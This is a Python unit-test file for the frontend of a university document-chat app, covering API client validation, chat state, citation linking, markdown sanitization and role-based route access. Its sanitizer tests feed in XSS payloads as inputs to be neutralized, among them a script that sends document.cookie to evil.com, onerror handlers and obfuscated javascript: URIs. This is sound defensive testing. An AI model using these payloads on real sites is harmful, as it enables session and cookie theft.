"""
Behavioral and Contract Unit Tests for Frontend Presentation Layer.

Validates pure client-side contracts, data transformations, and state management
independently of database services, Starlette/NiceGUI request contexts, or visual markup:
- API client input validation, DTO conversions, and mocked response handling.
- AppState in-memory lifecycle and state mutations (pure unit isolation).
  (Note: Per-browser-session isolation via Starlette/NiceGUI request_contextvar is
   tested in integration tests under backend/tests/integration/test_frontend_workflows.py).
- Citation parsing, semantic linking, code-block preservation, and security escaping.
- Markdown sanitization, URI scheme neutralizing (javascript:, vbscript:, data:text/html),
  and error normalization.
- Stable role-based capability and route access semantics (fail-closed unknown roles).
"""

import uuid
from unittest.mock import MagicMock

import pytest

from backend.app.core.permissions import Permission
from frontend.client.api_client import FrontendAPIClient
from frontend.client.citations import (
    SemanticCitationRef,
    extract_resolved_citations,
    replace_citation_markers,
)
from frontend.client.content_safety import sanitize_markdown_text
from frontend.client.error_handler import normalize_error
from frontend.client.models import (
    AdminUserDTO,
    ChatMessageDTO,
    CitationDTO,
    KnowledgeBaseDTO,
    UserDTO,
)
from frontend.security.access_control import can_access_route, has_admin_permission
from frontend.state.app_state import AppState

# ==============================================================================
# A. API CLIENT PURE UNIT CONTRACTS
# ==============================================================================


class TestAPIClientUnitContracts:
    """Test suite validating API client communication contracts and data transformations."""

    def test_api_client_initial_state(self) -> None:
        client = FrontendAPIClient()
        assert client.get_current_user() is None
        assert client.get_session_token() is None

    def test_api_client_auth_input_validation(self) -> None:
        client = FrontendAPIClient()

        with pytest.raises(ValueError, match="Email and password must not be empty"):
            client.login("", "secret")

        with pytest.raises(ValueError, match="Email and password must not be empty"):
            client.login("user@test.edu", "")

        with pytest.raises(ValueError, match="All registration fields are required"):
            client.register("", "secret", "Name")

        with pytest.raises(ValueError, match="must not be empty"):
            client.student_login("", "")

        with pytest.raises(ValueError, match="must not be empty"):
            client.admin_login("", "")

    def test_api_client_unauthorized_401_clears_auth_state(self) -> None:
        client = FrontendAPIClient()
        client._session_token = "expired-token-xyz"
        client._current_user = UserDTO(
            id="test-1",
            email="expired@university.edu",
            full_name="Expired User",
            role="STUDENT",
        )

        mock_resp = MagicMock()
        mock_resp.status_code = 401
        mock_resp.json.return_value = {"detail": "Session expired or invalid"}
        client._http.get = MagicMock(return_value=mock_resp)

        user = client.get_current_user()
        assert user is None
        assert client._current_user is None
        assert client.get_session_token() is None

    def test_api_client_forbidden_403_handling(self) -> None:
        client = FrontendAPIClient()
        mock_resp = MagicMock()
        mock_resp.status_code = 403
        mock_resp.json.return_value = {
            "detail": "This account belongs to the Administrator Portal. Please use Administrator Sign In."
        }
        client._http.post = MagicMock(return_value=mock_resp)

        with pytest.raises(ValueError, match="Administrator Portal"):
            client.login("admin@university.edu", "AdminPass123!", required_role="STUDENT")

    def test_api_client_chat_response_dto_conversion_and_provenance(self) -> None:
        client = FrontendAPIClient()
        kb_id = str(uuid.uuid4())

        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {
            "query": "Explain normal forms.",
            "processed_query": "explain normal forms",
            "knowledge_base_id": kb_id,
            "answer": "3NF eliminates transitive dependencies [source_1].",
            "is_empty_context": False,
            "citations": [
                {
                    "source_id": "source_1",
                    "document_name": "db_design.pdf",
                    "document_id": str(uuid.uuid4()),
                    "chunk_id": "chunk-301",
                    "page_number": 88,
                    "section_title": "Normalization",
                    "relevance_score": 0.94,
                    "snippet": "Third normal form removes transitive functional dependencies.",
                }
            ],
            "grounding": {
                "is_grounded": True,
                "status": "FULLY_SUPPORTED",
                "citation_validity_rate": 1.0,
                "citation_coverage": 1.0,
                "claim_support_rate": 1.0,
                "unsupported_claim_rate": 0.0,
                "has_conflicts": False,
                "claims": [],
            },
            "latency": {
                "query_processing_ms": 1.0,
                "retrieval_ms": 10.0,
                "reranking_ms": 5.0,
                "context_assembly_ms": 0.5,
                "llm_generation_ms": 90.0,
                "grounding_validation_ms": 2.0,
                "total_pipeline_ms": 108.5,
            },
            "model": "qwen3:4b",
            "metadata": {},
        }
        client._http.post = MagicMock(return_value=mock_resp)

        msg = client.send_chat_message(kb_id=kb_id, question="Explain normal forms.")
        assert isinstance(msg, ChatMessageDTO)
        assert msg.role == "assistant"
        assert msg.content == "3NF eliminates transitive dependencies [source_1]."
        assert msg.is_grounded is True
        assert msg.grounding_status == "FULLY_SUPPORTED"
        assert msg.total_pipeline_ms == 108.5
        assert len(msg.citations) == 1

        cit = msg.citations[0]
        assert isinstance(cit, CitationDTO)
        assert cit.source_id == "source_1"
        assert cit.document_name == "db_design.pdf"
        assert cit.page_number == 88

    def test_api_client_chat_validation_contracts(self) -> None:
        client = FrontendAPIClient()

        # Empty question
        with pytest.raises(ValueError, match="Question cannot be empty"):
            client.send_chat_message(str(uuid.uuid4()), "   ")

        # Invalid UUID
        with pytest.raises(ValueError, match="Invalid knowledge base ID format"):
            client.send_chat_message("not-a-uuid", "Valid question")

    def test_api_client_retrieval_validation_contracts(self) -> None:
        client = FrontendAPIClient()
        dummy_kb_id = str(uuid.uuid4())

        # Empty query validation
        with pytest.raises(ValueError, match="Query string cannot be empty"):
            client.retrieve_chunks(dummy_kb_id, "   ")
        with pytest.raises(ValueError, match="Query string cannot be empty"):
            client.retrieve_lexical_chunks(dummy_kb_id, "   ")
        with pytest.raises(ValueError, match="Query string cannot be empty"):
            client.retrieve_hybrid_chunks(dummy_kb_id, "   ")
        with pytest.raises(ValueError, match="Query string cannot be empty"):
            client.rerank_chunks(dummy_kb_id, "   ")

        # Invalid UUID validation
        with pytest.raises(ValueError, match="Invalid knowledge base ID format"):
            client.retrieve_chunks("not-a-uuid", "query")

    def test_api_client_admin_user_dto_privacy(self) -> None:
        dto = AdminUserDTO(
            email="faculty@univ.edu",
            full_name="Faculty Admin",
            role="ADMIN",
            is_active=True,
            created_at="2026-10-01",
        )
        assert not hasattr(dto, "password") or "password" not in dto.model_fields
        assert not hasattr(dto, "hashed_password") or "hashed_password" not in dto.model_fields

    def test_api_client_malformed_backend_response_handling(self) -> None:
        client = FrontendAPIClient()
        mock_resp = MagicMock()
        mock_resp.status_code = 500
        mock_resp.json.side_effect = Exception("Invalid JSON")
        mock_resp.text = "Internal Server Error"
        client._http.get = MagicMock(return_value=mock_resp)

        with pytest.raises(ValueError) as excinfo:
            client.get_knowledge_bases()
        err = str(excinfo.value).lower()
        assert "server processing error" in err or "could not be completed" in err

    def test_api_client_has_portal_methods(self) -> None:
        client = FrontendAPIClient()
        assert hasattr(client, "student_login")
        assert callable(client.student_login)
        assert hasattr(client, "admin_login")
        assert callable(client.admin_login)


# ==============================================================================
# B. FRONTEND STATE PURE UNIT CONTRACTS
# ==============================================================================


class TestFrontendStateUnitContracts:
    """Test suite for AppState presentation state management."""

    def test_app_state_initialization(self) -> None:
        state = AppState()
        assert state._active_kb is None
        assert state.chat_history == []
        assert state.selected_citation is None
        assert state.is_generating is False
        assert state.generation_error is None

    def test_app_state_active_kb_selection(self) -> None:
        state = AppState()
        sample_kb = KnowledgeBaseDTO(
            id=str(uuid.uuid4()),
            name="Computer Architecture",
            description="Hardware syllabus",
            document_count=3,
            created_at="2026-10-01",
        )
        state.active_kb = sample_kb
        assert state.active_kb == sample_kb
        assert state.active_kb.name == "Computer Architecture"

    def test_app_state_message_flow_and_ordering(self) -> None:
        state = AppState()
        user_msg = state.add_user_message("What is pipelining?")
        assert user_msg.role == "user"
        assert len(state.chat_history) == 1

        asst_msg = ChatMessageDTO(
            id="resp-1",
            role="assistant",
            content="Pipelining overlaps instruction execution.",
            citations=[],
        )
        state.add_assistant_message(asst_msg)
        assert len(state.chat_history) == 2
        assert state.chat_history[0].role == "user"
        assert state.chat_history[1].role == "assistant"

    def test_app_state_clear_chat_resets_conversation_and_citations(self) -> None:
        state = AppState()
        state.add_user_message("Test")
        state.selected_citation = CitationDTO(
            document_name="doc.pdf",
            page_number=1,
            chunk_id="c-1",
            snippet="Snippet",
            relevance_score=0.9,
        )
        state._is_generating = True
        state._generation_error = "Error"

        state.clear_chat()
        assert len(state.chat_history) == 0
        assert state.selected_citation is None
        assert state.is_generating is False
        assert state.generation_error is None

    def test_app_state_is_admin_property(self, monkeypatch: pytest.MonkeyPatch) -> None:
        from frontend.client.api_client import api_client

        # Mock unauthenticated
        monkeypatch.setattr(api_client, "get_current_user", lambda: None)
        state = AppState()
        assert state.is_admin is False

        # Mock admin
        admin_user = UserDTO(
            id="admin-1",
            email="admin@univ.edu",
            full_name="Admin",
            role="ADMIN",
        )
        monkeypatch.setattr(api_client, "get_current_user", lambda: admin_user)
        assert state.is_admin is True

        # Mock student
        student_user = UserDTO(
            id="student-1",
            email="student@univ.edu",
            full_name="Student",
            role="STUDENT",
        )
        monkeypatch.setattr(api_client, "get_current_user", lambda: student_user)
        assert state.is_admin is False


# ==============================================================================
# C. CITATION PROCESSING PURE UNIT CONTRACTS
# ==============================================================================


class TestCitationProcessingUnitContracts:
    """Test suite validating semantic citation linking, safety, and markdown integrity."""

    @pytest.fixture
    def sample_citations(self) -> list[CitationDTO]:
        return [
            CitationDTO(
                document_id="doc-uuid-1",
                document_name="KSU-Act-English.pdf",
                page_number=12,
                chunk_id="chunk-1",
                snippet="Powers of the Governing Board under Section 12.",
                relevance_score=0.95,
                knowledge_base_id="kb-uuid-1",
                course_name="BCA Regulations",
            ),
            CitationDTO(
                document_id="doc-uuid-2",
                document_name="Syllabus-2026.pdf",
                page_number=45,
                chunk_id="chunk-2",
                snippet="Grading policy requires passing marks in theory and practicals.",
                relevance_score=0.91,
                knowledge_base_id="kb-uuid-1",
                course_name="BCA Regulations",
            ),
        ]

    def test_citation_mapping_numeric_bracket(self, sample_citations: list[CitationDTO]) -> None:
        text = "As stated in the act [1]."
        resolved = extract_resolved_citations(text, sample_citations)
        assert len(resolved) == 1
        assert resolved[0].index == 1
        assert resolved[0].citation.document_name == "KSU-Act-English.pdf"
        assert resolved[0].raw_marker == "[1]"

    def test_citation_mapping_source_bracket(self, sample_citations: list[CitationDTO]) -> None:
        text = "As stated in the act [source_1]."
        resolved = extract_resolved_citations(text, sample_citations)
        assert len(resolved) == 1
        assert resolved[0].index == 1
        assert resolved[0].citation.document_name == "KSU-Act-English.pdf"
        assert resolved[0].raw_marker == "[source_1]"

    def test_citation_mapping_multiple_citations(self, sample_citations: list[CitationDTO]) -> None:
        text = "Refer to the board powers [1] and the grading policy [2]."
        resolved = extract_resolved_citations(text, sample_citations)
        assert len(resolved) == 2
        assert resolved[0].index == 1
        assert resolved[0].citation.document_name == "KSU-Act-English.pdf"
        assert resolved[1].index == 2
        assert resolved[1].citation.document_name == "Syllabus-2026.pdf"

    def test_citation_invalid_reference_preserved_as_text(self, sample_citations: list[CitationDTO]) -> None:
        text = "Unavailable citations [99] and [source_99] should not crash."
        resolved = extract_resolved_citations(text, sample_citations)
        assert len(resolved) == 0

        # Unresolved markers must remain intact in text when substituted
        replaced = replace_citation_markers(text, sample_citations, lambda ref: f"RESOLVED_{ref.index}")
        assert "[99]" in replaced
        assert "[source_99]" in replaced

    def test_citation_does_not_corrupt_standard_markdown_links(self, sample_citations: list[CitationDTO]) -> None:
        text = "According to [1], visit [University Portal](https://university.edu) for details."
        resolved = extract_resolved_citations(text, sample_citations)
        assert len(resolved) == 1
        assert resolved[0].index == 1

        replaced = replace_citation_markers(text, sample_citations, lambda ref: f"({ref.index})")
        assert "(1)" in replaced
        assert "[University Portal](https://university.edu)" in replaced

    def test_citation_output_contains_no_session_tokens(self, sample_citations: list[CitationDTO]) -> None:
        text = "Document reference [1]."
        resolved = extract_resolved_citations(text, sample_citations)
        assert len(resolved) == 1

        def safe_formatter(ref: SemanticCitationRef) -> str:
            return f"[{ref.index}: {ref.citation.document_name}]"

        replaced = replace_citation_markers(text, sample_citations, safe_formatter)
        assert "token=" not in replaced
        assert "auth_session_token" not in replaced
        assert "cookie" not in replaced

    def test_citation_metadata_handling(self) -> None:
        malicious_citations = [
            CitationDTO(
                document_id="doc-malicious",
                document_name='"><script>alert(1)</script>.pdf',
                page_number=1,
                chunk_id="chunk-malicious",
                snippet='"><img src=x onerror="alert(\'xss\')">',
                relevance_score=0.9,
            )
        ]
        text = "Check this source [1]."
        resolved = extract_resolved_citations(text, malicious_citations)
        assert len(resolved) == 1
        assert resolved[0].index == 1
        assert resolved[0].citation.document_id == "doc-malicious"
        assert resolved[0].citation.document_name == '"><script>alert(1)</script>.pdf'

    def test_citation_markers_in_code_blocks_and_inline_code_are_preserved(
        self, sample_citations: list[CitationDTO]
    ) -> None:
        text = (
            "Here is array indexing `arr[1]` and a code block:\n"
            "```python\n"
            "items = [1, 2]\n"
            "val = items[1]\n"
            "source = [source_1]\n"
            "```\n"
            "Now here is a real citation [1] and [source_2]."
        )
        resolved = extract_resolved_citations(text, sample_citations)
        assert len(resolved) == 2
        assert resolved[0].index == 1
        assert resolved[1].index == 2

        replaced = replace_citation_markers(text, sample_citations, lambda ref: f"CIT_{ref.index}")
        assert "`arr[1]`" in replaced
        assert "items = [1, 2]" in replaced
        assert "val = items[1]" in replaced
        assert "source = [source_1]" in replaced
        assert "CIT_1" in replaced
        assert "CIT_2" in replaced


# ==============================================================================
# D. MARKDOWN / OUTPUT SECURITY PURE UNIT CONTRACTS
# ==============================================================================


class TestMarkdownOutputSecurityUnitContracts:
    """Test suite validating client-side HTML output sanitization and error masking."""

    def test_markdown_sanitizer_preserves_valid_markdown(self) -> None:
        normal = "**Bold statement** with *italics* and `inline_code()`.\n- Item 1\n- Item 2"
        assert sanitize_markdown_text(normal) == normal

    def test_markdown_sanitizer_neutralizes_script_tags(self) -> None:
        dangerous = "Answer: <script>window.location='http://evil.com?c='+document.cookie;</script>"
        sanitized = sanitize_markdown_text(dangerous)
        assert "<script>" not in sanitized
        assert "window.location" not in sanitized

    def test_markdown_sanitizer_neutralizes_iframes(self) -> None:
        dangerous = 'Information: <iframe src="http://evil.com/phish"></iframe>'
        sanitized = sanitize_markdown_text(dangerous)
        assert "<iframe" not in sanitized

    def test_markdown_sanitizer_neutralizes_event_handlers(self) -> None:
        dangerous = '<img src="missing.png" onerror="alert(document.cookie)">'
        sanitized = sanitize_markdown_text(dangerous)
        assert "onerror=" not in sanitized

    def test_markdown_sanitizer_neutralizes_javascript_uri(self) -> None:
        malicious = "[Click Me](javascript:alert(1))"
        sanitized = sanitize_markdown_text(malicious)
        assert "javascript:" not in sanitized.lower()
        assert "[Click Me](#)" in sanitized

    def test_markdown_sanitizer_neutralizes_mixed_case_and_whitespace_javascript(self) -> None:
        cases = [
            "[Link](JaVaScRiPt:alert(1))",
            "[Link](  javascript:alert(1))",
            "[Link](\tjavascript:alert(1))",
            "[Link](jav&#x61;script:alert(1))",
        ]
        for c in cases:
            sanitized = sanitize_markdown_text(c)
            assert "(#)" in sanitized
            assert "javascript" not in sanitized.lower()

    def test_markdown_sanitizer_neutralizes_vbscript_uri(self) -> None:
        malicious = "[VBScript Link](vbscript:msgbox(1))"
        sanitized = sanitize_markdown_text(malicious)
        assert "vbscript:" not in sanitized.lower()
        assert "(#)" in sanitized

    def test_markdown_sanitizer_neutralizes_dangerous_data_uris(self) -> None:
        malicious = "[Data Link](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)"
        sanitized = sanitize_markdown_text(malicious)
        assert "data:text/html" not in sanitized.lower()
        assert "(#)" in sanitized

    def test_markdown_sanitizer_neutralizes_dangerous_html_href_and_src(self) -> None:
        html_input = '<a href="javascript:alert(1)">Click</a><img src="javascript:alert(2)">'
        sanitized = sanitize_markdown_text(html_input)
        assert 'href="#"' in sanitized
        assert "javascript:" not in sanitized.lower()

    def test_markdown_sanitizer_preserves_legitimate_https_links(self) -> None:
        legit = "[University Portal](https://university.edu)"
        sanitized = sanitize_markdown_text(legit)
        assert sanitized == legit

    def test_citation_link_security_and_safe_anchor(self) -> None:
        from frontend.pages.chat_page import format_citation_links

        sample_cit = [
            CitationDTO(
                document_id="doc-1",
                document_name="Regulations.pdf",
                page_number=5,
                chunk_id="chk-1",
                snippet="Valid snippet",
                relevance_score=0.9,
            )
        ]
        text = "According to the university charter [1]."
        formatted = format_citation_links(text, sample_cit)
        sanitized = sanitize_markdown_text(formatted)

        assert 'href="javascript:' not in formatted.lower()
        assert 'href="#"' in formatted
        assert "data-citation-index=\"1\"" in formatted
        assert "auth_session_token" not in formatted
        assert "token=" not in formatted
        assert 'href="#"' in sanitized

    def test_error_normalizer_suppresses_sql_and_tracebacks(self) -> None:
        raw_sql_error = (
            "psycopg.errors.SyntaxError: syntax error at or near 'SELECT'\n"
            "LINE 1: SELECT * FROM credentials WHERE token='secret_abc';\n"
            "Traceback (most recent call last):\n"
            '  File "db.py", line 42, in execute\n'
        )
        normalized = normalize_error(raw_sql_error)
        assert "server processing error" in normalized.lower()
        assert "SELECT" not in normalized
        assert "secret_abc" not in normalized
        assert "Traceback" not in normalized

    def test_error_normalizer_contextual_messages(self) -> None:
        assert "invalid email or password" in normalize_error(401, context="auth").lower()
        assert "already exists" in normalize_error("AUTH_EMAIL_EXISTS", context="auth").lower()
        assert "size" in normalize_error(413, context="document").lower()
        assert "format" in normalize_error(415, context="document").lower()

    def test_wrong_portal_directional_guidance(self) -> None:
        admin_guidance = (
            "This account belongs to the Administrator Portal. Please use Administrator Sign In."
        )
        student_guidance = (
            "This account does not have administrator access. Please use Student Sign In."
        )

        assert normalize_error(admin_guidance, context="auth") == admin_guidance
        assert normalize_error(student_guidance, context="auth") == student_guidance
        assert normalize_error({"detail": admin_guidance}, context="auth") == admin_guidance
        assert normalize_error({"detail": student_guidance}, context="auth") == student_guidance


# ==============================================================================
# E. ROLE CAPABILITY AND ROUTE ACCESS PURE UNIT CONTRACTS
# ==============================================================================


class TestRoleCapabilityUnitContracts:
    """Test suite validating role capabilities and route access independent of visual UI."""

    def test_unauthenticated_can_only_access_public_routes(self) -> None:
        assert can_access_route(None, "/login") is True
        assert can_access_route(None, "/student/login") is True
        assert can_access_route(None, "/admin/login") is True
        assert can_access_route(None, "/register") is True

        assert can_access_route(None, "/dashboard") is False
        assert can_access_route(None, "/chat") is False
        assert can_access_route(None, "/knowledge-bases") is False
        assert can_access_route(None, "/documents") is False
        assert can_access_route(None, "/administrators") is False
        assert can_access_route(None, "/indexing") is False
        assert can_access_route(None, "/system-health") is False

    def test_unknown_role_is_denied_protected_routes(self) -> None:
        unknown_user = UserDTO(
            id="u-unknown",
            email="unknown@univ.edu",
            full_name="Guest",
            role="GUEST",
        )
        protected_routes = [
            "/dashboard",
            "/profile",
            "/chat",
            "/knowledge-bases",
            "/documents",
            "/indexing",
            "/administrators",
            "/activity",
            "/system-health",
        ]
        for route in protected_routes:
            assert (
                can_access_route(unknown_user, route) is False
            ), f"Unknown role must be denied access to protected route {route}"

        # Test malformed role fails closed
        malformed_user = UserDTO(
            id="u-bad",
            email="bad@univ.edu",
            full_name="Bad Role",
            role="MALFORMED_ROLE",
        )
        for route in protected_routes:
            assert can_access_route(malformed_user, route) is False

    def test_student_role_route_capabilities(self) -> None:
        student = UserDTO(
            id="s-100",
            email="student@univ.edu",
            full_name="Enrolled Student",
            role="STUDENT",
        )
        # Permitted student capabilities
        assert can_access_route(student, "/dashboard") is True
        assert can_access_route(student, "/knowledge-bases") is True
        assert can_access_route(student, "/chat") is True
        assert can_access_route(student, "/profile") is True

        # Prohibited administrator capabilities
        assert can_access_route(student, "/documents") is False
        assert can_access_route(student, "/administrators") is False
        assert can_access_route(student, "/system-health") is False
        assert can_access_route(student, "/indexing") is False
        assert can_access_route(student, "/activity") is False

        # Student cannot hold admin permissions
        for perm in [
            Permission.ADMIN_CHAT,
            Permission.ADMIN_VIEW,
            Permission.COURSE_CREATE,
            Permission.DOCUMENT_UPLOAD,
        ]:
            assert has_admin_permission(student, perm) is False

    def test_main_admin_role_route_capabilities(self) -> None:
        admin = UserDTO(
            id="a-100",
            email="admin@univ.edu",
            full_name="Administrator",
            role="ADMIN",
            admin_role="MAIN_ADMIN",
        )
        # Main Admin has full capabilities across all sections
        for route in [
            "/dashboard",
            "/knowledge-bases",
            "/documents",
            "/indexing",
            "/chat",
            "/administrators",
            "/activity",
            "/system-health",
            "/profile",
        ]:
            assert can_access_route(admin, route) is True

    def test_faculty_admin_indexing_requires_document_index_permission(self) -> None:
        """Verify indexing route strictly requires DOCUMENT_INDEX or DOCUMENT_INDEX_RETRY, not DOCUMENT_VIEW."""
        faculty_view_only = UserDTO(
            id="fa-view",
            email="view_only@univ.edu",
            full_name="View Only Faculty",
            role="ADMIN",
            admin_role="FACULTY_ADMIN",
            permissions=[Permission.DOCUMENT_VIEW.value],
        )
        assert can_access_route(faculty_view_only, "/documents") is True
        assert can_access_route(faculty_view_only, "/indexing") is False
        assert has_admin_permission(faculty_view_only, Permission.DOCUMENT_INDEX) is False

        faculty_with_index = faculty_view_only.model_copy(
            update={"permissions": [Permission.DOCUMENT_INDEX.value]}
        )
        assert can_access_route(faculty_with_index, "/indexing") is True
        assert has_admin_permission(faculty_with_index, Permission.DOCUMENT_INDEX) is True

        faculty_with_retry = faculty_view_only.model_copy(
            update={"permissions": [Permission.DOCUMENT_INDEX_RETRY.value]}
        )
        assert can_access_route(faculty_with_retry, "/indexing") is True
        assert has_admin_permission(faculty_with_retry, Permission.DOCUMENT_INDEX_RETRY) is True

    def test_faculty_admin_course_view_and_admin_view_permissions(self) -> None:
        """Verify faculty admin fine-grained capabilities for course and administrator sections."""
        faculty = UserDTO(
            id="fa-2",
            email="fa2@univ.edu",
            full_name="Faculty Two",
            role="ADMIN",
            admin_role="FACULTY_ADMIN",
            permissions=[],
        )
        # Without COURSE_VIEW
        assert can_access_route(faculty, "/knowledge-bases") is False
        # Without ADMIN_VIEW
        assert can_access_route(faculty, "/administrators") is False
        assert can_access_route(faculty, "/activity") is False
        assert can_access_route(faculty, "/system-health") is False

        # With COURSE_VIEW and ADMIN_VIEW
        granted = faculty.model_copy(
            update={"permissions": [Permission.COURSE_VIEW.value, Permission.ADMIN_VIEW.value]}
        )
        assert can_access_route(granted, "/knowledge-bases") is True
        assert can_access_route(granted, "/administrators") is True
        assert can_access_route(granted, "/activity") is True
        assert can_access_route(granted, "/system-health") is True

    def test_faculty_admin_chat_permission_capability_scope(self) -> None:
        faculty_without_chat = UserDTO(
            id="fa-1",
            email="faculty1@univ.edu",
            full_name="Faculty One",
            role="ADMIN",
            admin_role="FACULTY_ADMIN",
            permissions=[Permission.DOCUMENT_VIEW.value],
        )
        assert can_access_route(faculty_without_chat, "/chat") is False
        assert has_admin_permission(faculty_without_chat, Permission.ADMIN_CHAT) is False
        assert can_access_route(faculty_without_chat, "/documents") is True

        faculty_with_chat = faculty_without_chat.model_copy(
            update={
                "permissions": [
                    Permission.DOCUMENT_VIEW.value,
                    Permission.ADMIN_CHAT.value,
                ]
            }
        )
        assert can_access_route(faculty_with_chat, "/chat") is True
        assert has_admin_permission(faculty_with_chat, Permission.ADMIN_CHAT) is True
